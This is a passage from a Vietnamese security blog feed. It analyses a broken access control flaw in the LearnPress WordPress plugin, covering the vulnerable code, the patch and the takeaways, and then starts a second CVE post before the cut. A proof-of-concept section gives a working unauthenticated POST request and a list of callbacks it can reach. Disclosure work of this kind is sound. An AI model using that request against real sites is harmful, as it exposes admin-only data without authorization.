) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: params invalid!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;// @var array $args&#xA;&#x9;&#x9;&#x9;$args     = $params[&amp;#39;args&amp;#39;];&#xA;&#x9;&#x9;&#x9;$callBack = $params[&amp;#39;callback&amp;#39;];&#xA;&#xA;&#x9;&#x9;&#x9;if ( empty( $callBack[&amp;#39;class&amp;#39;] ) ||&#xA;&#x9;&#x9;&#x9;&#x9;empty( $callBack[&amp;#39;method&amp;#39;] ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: callback invalid!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;$class  = $callBack[&amp;#39;class&amp;#39;];&#xA;&#x9;&#x9;&#x9;$method = $callBack[&amp;#39;method&amp;#39;];&#xA;&#xA;&#x9;&#x9;&#x9;// Security: check callback is registered.&#xA;&#x9;&#x9;&#x9;$allow_callbacks = apply_filters(&#xA;&#x9;&#x9;&#x9;&#x9;&amp;#39;lp/rest/ajax/allow_callback&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;[]&#xA;&#x9;&#x9;&#x9;);&#xA;&#x9;&#x9;&#x9;$callBackStr     = $class . &amp;#39;:&amp;#39; . $method;&#xA;&#x9;&#x9;&#x9;if ( ! in_array( $callBackStr, $allow_callbacks ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: callback is not register!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;// Check class and method is callable.&#xA;&#x9;&#x9;&#x9;if ( is_callable( [ $class, $method ] ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$data = call_user_func( [ $class, $method ], $args );&#xA;&#x9;&#x9;&#x9;} else {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: callback is not callable!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;if ( ! $data instanceof stdClass &amp;amp;&amp;amp; ! isset( $data-&amp;gt;content ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: data content invalid!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;message = $data-&amp;gt;message ?? &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;&#x9;unset( $data-&amp;gt;message );&#xA;&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;status = &amp;#39;success&amp;#39;;&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;data   = $data;&#xA;&#x9;&#x9;} catch ( Throwable $e ) {&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;status  = &amp;#39;error&amp;#39;;&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;message = $e-&amp;gt;getMessage();&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;wp_send_json( $response );&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√°c bi·∫øn c·∫ßn thi·∫øt cho &lt;code&gt;call_user_func&lt;/code&gt; ƒë∆∞·ª£c h√¨nh th√†nh tr·ª±c ti·∫øp t·ª´ ch√≠nh ƒëo·∫°n code n√†y v√† li√™n k·∫øt v·ªõi nhau theo ƒë√∫ng lu·ªìng x·ª≠ l√Ω:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$params = LP_Helper::json_decode( $params, true );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bi·∫øn &lt;code&gt;$params&lt;/code&gt; l√† m·∫£ng d·ªØ li·ªáu ƒë·∫ßu v√†o sau khi gi·∫£i m√£ JSON t·ª´ request, trong ƒë√≥ b·∫Øt bu·ªôc ph·∫£i c√≥ th√¥ng tin callback v√† tham s·ªë.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$args     = $params[&amp;#39;args&amp;#39;];&#xA;$callBack = $params[&amp;#39;callback&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$args&lt;/code&gt; ch·ª©a c√°c tham s·ªë s·∫Ω ƒë∆∞·ª£c truy·ªÅn v√†o h√†m ƒë∆∞·ª£c g·ªçi, c√≤n &lt;code&gt;$callBack&lt;/code&gt; m√¥ t·∫£ callback c·∫ßn th·ª±c thi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$class  = $callBack[&amp;#39;class&amp;#39;];&#xA;$method = $callBack[&amp;#39;method&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hai bi·∫øn n√†y x√°c ƒë·ªãnh ch√≠nh x√°c &lt;strong&gt;class&lt;/strong&gt; v√† &lt;strong&gt;ph∆∞∆°ng th·ª©c&lt;/strong&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªông.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callBackStr = $class . &amp;#39;:&amp;#39; . $method;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chu·ªói n√†y ƒë∆∞·ª£c d√πng ƒë·ªÉ ƒë·ªëi chi·∫øu v·ªõi danh s√°ch callback ƒë∆∞·ª£c ph√©p trong &lt;code&gt;$allow_callbacks&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;H√†ng lo·∫°t c√°c callback ƒë∆∞·ª£c ƒëƒÉng k√Ω cho filter &lt;code&gt;lp/rest/ajax/allow_callback&lt;/code&gt; th√¥ng qua h√†m &lt;code&gt;add_filter&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/filter.png&#34; title=&#34;ƒêƒÉng k√Ω callback cho filter lp/rest/ajax/allow_callback&#34; data-thumbnail=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;ƒêƒÉng k√Ω callback cho filter lp/rest/ajax/allow_callback&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/filter.png&#39; alt=&#34;Filter&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;ƒêƒÉng k√Ω callback cho filter lp/rest/ajax/allow_callback&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function allow_callback( array $callbacks ): array {&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_edit_quiz&amp;#39;;&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_list_items_not_assign&amp;#39;;&#xA;&#xA;  return $callbacks;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m nh·∫≠n m·∫£ng &lt;code&gt;$callbacks&lt;/code&gt; hi·ªán c√≥, sau ƒë√≥ th√™m v√†o hai chu·ªói d·∫°ng &lt;code&gt;T√™nClass:method&lt;/code&gt; c·ªßa class hi·ªán t·∫°i, r·ªìi tr·∫£ l·∫°i m·∫£ng ƒë√≥ ƒë·ªÉ WordPress s·ª≠ d·ª•ng l√†m danh s√°ch callback h·ª£p l·ªá. Khi debug, ta s·∫Ω th·∫•y to√†n b·ªô c√°c callback ƒë∆∞·ª£c ƒëƒÉng k√Ω:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/allow.png&#34; title=&#34;Danh s√°ch c√°c callback h·ª£p l·ªá&#34; data-thumbnail=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/allow.png&#34; data-sub-html=&#34;&lt;h2&gt;Allow&lt;/h2&gt;&lt;p&gt;Danh s√°ch c√°c callback h·ª£p l·ªá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/allow.png&#39; alt=&#34;Allow&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Danh s√°ch c√°c callback h·ª£p l·ªá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( is_callable( [ $class, $method ] ) ) {&#xA;    $data = call_user_func( [ $class, $method ], $args );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;M·∫£ng &lt;code&gt;[ $class, $method ]&lt;/code&gt; ch√≠nh l√† callback h·ª£p l·ªá m√† &lt;code&gt;call_user_func&lt;/code&gt; y√™u c·∫ßu. Khi ƒëi·ªÅu ki·ªán &lt;code&gt;is_callable&lt;/code&gt; ƒë√∫ng, WordPress s·∫Ω g·ªçi ph∆∞∆°ng th·ª©c &lt;code&gt;$method&lt;/code&gt; c·ªßa class &lt;code&gt;$class&lt;/code&gt; v√† truy·ªÅn bi·∫øn &lt;code&gt;$args&lt;/code&gt; l√†m tham s·ªë duy nh·∫•t cho ph∆∞∆°ng th·ª©c ƒë√≥.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;L·ªó h·ªïng ph√°t sinh do API kh√¥ng th·ª±c hi·ªán b·∫•t k·ª≥ ki·ªÉm tra quy·ªÅn (capability/permission) n√†o.&lt;/strong&gt; ƒêi·ªÅu n√†y cho ph√©p m·ªçi ng∆∞·ªùi d√πng ‚Äì k·ªÉ c·∫£ kh√¥ng c√≥ quy·ªÅn qu·∫£n tr·ªã ‚Äì g·ªçi v√†o endpoint v√† y√™u c·∫ßu th·ª±c thi b·∫•t k·ª≥ callback n√†o n·∫±m trong danh s√°ch callback h·ª£p l·ªá, d√π nh·ªØng callback ƒë√≥ l·∫Ω ra ch·ªâ d√†nh cho admin.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v4.3.2)&lt;/strong&gt; b·ªï sung v√†o h√†m &lt;code&gt;load_content_via_ajax&lt;/code&gt; b∆∞·ªõc x√°c th·ª±c quy·ªÅn b·∫±ng c√°ch c·ªë ƒë·ªãnh danh s√°ch callback ƒë∆∞·ª£c ph√©p g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$allow_callbacks = apply_filters(&#xA;    &amp;#39;lp/rest/ajax/allow_callback&amp;#39;,&#xA;    [&#xA;        &amp;#39;LP_Admin_Dashboard:order_statistic&amp;#39;,&#xA;        &amp;#39;LP_Admin_Dashboard:plugin_status_content&amp;#39;,&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ch·ªâ nh·ªØng callback c√≥ t√™n class v√† method kh·ªõp ch√≠nh x√°c v·ªõi &lt;code&gt;&#39;LP_Admin_Dashboard:order_statistic&#39;&lt;/code&gt; ho·∫∑c &lt;code&gt;&#39;LP_Admin_Dashboard:plugin_status_content&#39;&lt;/code&gt; m·ªõi v∆∞·ª£t qua ƒë∆∞·ª£c ki·ªÉm tra.&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;order_statistic&lt;/code&gt; v√† &lt;code&gt;plugin_status_content&lt;/code&gt; ƒë·ªÅu c√≥ c∆° ch·∫ø ki·ªÉm tra quy·ªÅn Administrator tr∆∞·ªõc khi th·ª±c thi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( UserModel::ROLE_ADMINISTRATOR ) ) {&#xA;  wp_die( esc_html__( &amp;#39;You do not have sufficient permissions to access this page.&amp;#39;, &amp;#39;learnpress&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nh·ªù ƒë√≥ l·ªó h·ªïng ƒë√£ ƒë∆∞·ª£c kho√° ch·∫∑t.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Unauthenticated attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send request with lp-load-ajax parameter&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;LoadContentViaAjax::catch_lp_ajax() triggered via init hook&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Check lp-load-ajax parameter exists&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Create instance of LoadContentViaAjax&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Class in $class_no_nonce whitelist ‚Üí Skip nonce check&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Retrieve $class and $method from request data&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Check if $class:$method is in $allow_callbacks (all callbacks allowed)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;is_callable([class, method])?&amp;#34;]&#xA;I --&amp;gt;|Yes| J[&amp;#34;Execute callback via call_user_func([class, method], args)&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Sensitive admin-only data returned to attacker&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;G·ª≠i request v·ªõi Unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST / HTTP/1.1&#xA;Host: localhost&#xA;Referer: http://localhost&#xA;&#xA;lp-load-ajax=load_content_via_ajax&amp;amp;data={&amp;#34;callback&amp;#34;:{&amp;#34;class&amp;#34;:&amp;#34;LearnPress\\TemplateHooks\\Admin\\AdminEditQizTemplate&amp;#34;,&amp;#34;method&amp;#34;:&amp;#34;render_list_items_not_assign&amp;#34;},&amp;#34;args&amp;#34;:{&amp;#34;quiz_id&amp;#34;:483}}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/result.png&#39; alt=&#34;Result&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Danh s√°ch c√°c callback h·ª£p l·ªá kh√°c:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;LearnPress\TemplateHooks\Course\ListCoursesTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\ListCoursesRelatedTemplate:render_courses&#xA;LearnPress\TemplateHooks\Course\SingleCourseTemplate:render_html_comments&#xA;LearnPress\TemplateHooks\Profile\ProfileQuizzesTemplate:renderContent&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_edit_course_curriculum&#xA;LearnPress\TemplateHooks\Course\AdminEditCurriculumTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_edit_quiz&#xA;LearnPress\TemplateHooks\Admin\AdminEditQizTemplate:render_list_items_not_assign&#xA;LearnPress\TemplateHooks\Admin\AdminEditQuestionTemplate:render_edit_question&#xA;LearnPress\TemplateHooks\Course\CourseMaterialTemplate:render_material_items&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesGrid:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesList:render_courses&#xA;LearnPress\ExternalPlugin\Elementor\Widgets\Course\Skins\CoursesLoopItem:render_courses&#xA;LearnPress\Gutenberg\Blocks\Courses\ListCoursesBlockType:render_courses&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Broken Access Control&lt;/strong&gt; trong LearnPress &amp;lt;= 4.3.1 cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c&lt;/strong&gt; th·ª±c thi c√°c callback AJAX v·ªën ch·ªâ d√†nh cho admin. V·∫•n ƒë·ªÅ ph√°t sinh do API kh√¥ng ki·ªÉm tra &lt;strong&gt;capability/permission&lt;/strong&gt; tr∆∞·ªõc khi g·ªçi &lt;code&gt;call_user_func([class, method], args)&lt;/code&gt;. B·∫£n v√° 4.3.2 ƒë√£ gi·ªõi h·∫°n callback h·ª£p l·ªá v√† y√™u c·∫ßu quy·ªÅn Administrator, ngƒÉn ch·∫∑n truy c·∫≠p tr√°i ph√©p.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng bao gi·ªù cho ph√©p callback ƒë·ªông th·ª±c thi m√† kh√¥ng ki·ªÉm tra quy·ªÅn.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;lp-load-ajax&lt;/code&gt; endpoint c√≥ th·ªÉ tr·ªü th√†nh l·ªó h·ªïng n·∫øu danh s√°ch callback kh√¥ng b·ªã gi·ªõi h·∫°n.&lt;/li&gt;&#xA;&lt;li&gt;Lu√¥n x√°c th·ª±c &lt;code&gt;nonce&lt;/code&gt; ho·∫∑c ki·ªÉm tra &lt;strong&gt;referer/domain&lt;/strong&gt; ƒë·ªÉ gi·∫£m r·ªßi ro t·ª´ request kh√¥ng h·ª£p l·ªá.&lt;/li&gt;&#xA;&lt;li&gt;B·∫£n v√° c·∫ßn &lt;strong&gt;c·ªë ƒë·ªãnh danh s√°ch callback&lt;/strong&gt; v√† k·∫øt h·ª£p v·ªõi ki·ªÉm tra quy·ªÅn admin cho c√°c ch·ª©c nƒÉng nh·∫°y c·∫£m.&lt;/li&gt;&#xA;&lt;li&gt;Broken Access Control th∆∞·ªùng ph√°t sinh ·ªü c√°c API AJAX/REST khi l·∫≠p tr√¨nh vi√™n tin t∆∞·ªüng d·ªØ li·ªáu ƒë·∫ßu v√†o t·ª´ client.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/learnpress/vulnerability/wordpress-learnpress-wordpress-lms-plugin-plugin-4-3-1-missing-authorization-to-unauthenticated-orders-statistics-exposure-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin &amp;lt;= 4.3.1 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-14508 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-15-cve-2025-14508/</link>
      <pubDate>Mon, 15 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-15-cve-2025-14508/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-15-cve-2025-14508/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;The MediaCommander ‚Äì Bring Folders to Media, Posts, and Pages&lt;/strong&gt; cho WordPress t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;x√≥a d·ªØ li·ªáu tr√°i ph√©p&lt;/strong&gt; do &lt;strong&gt;thi·∫øu ki·ªÉm tra quy·ªÅn (capability check)&lt;/strong&gt; t·∫°i &lt;strong&gt;REST API endpoint &lt;code&gt;import-csv&lt;/code&gt;&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n &lt;strong&gt;‚â§ 2.3.1&lt;/strong&gt;.&#xA;Nguy√™n nh√¢n l√† do endpoint n√†y ch·ªâ s·ª≠ d·ª•ng ki·ªÉm tra quy·ªÅn &lt;strong&gt;&lt;code&gt;upload_files&lt;/code&gt;&lt;/strong&gt; (&lt;strong&gt;c·∫•p Author&lt;/strong&gt;) cho m·ªôt &lt;strong&gt;thao t√°c mang t√≠nh ph√° h·ªßy&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;x√≥a to√†n b·ªô folder&lt;/strong&gt;.&#xA;ƒêi·ªÅu n√†y cho ph√©p 